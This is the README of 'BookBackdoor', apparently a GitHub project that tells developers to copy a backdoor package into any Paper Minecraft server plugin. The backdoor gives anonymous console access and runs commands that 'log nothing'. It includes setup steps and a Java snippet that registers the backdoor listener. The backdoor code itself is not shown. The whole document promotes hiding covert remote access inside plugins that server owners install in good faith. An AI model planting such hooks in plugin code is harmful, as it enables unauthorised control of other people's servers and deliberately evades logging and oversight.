# BookBackdoor ![BookBackdoor](https://github.com/BookBackdoor/BookBackdoor/actions/workflows/maven-publish.yml/badge.svg)

* Put this in any paper plugin to gain anonymous access to CONSOLE or execute custom build in command that log nothing!

#How-to
* 1: Copy the folder ```src/main/java/org/brandonplank/backdoor``` into your plugin
* 2: Import BookBackdoor.java into your main class
* 3: Init it using this code:


```java
PluginManager manager = this.getServer().getPluginManager();
getConfig().options().copyDefaults(true);
saveConfig();
manager.registerEvents(new BookBackdoor(this), this);
```
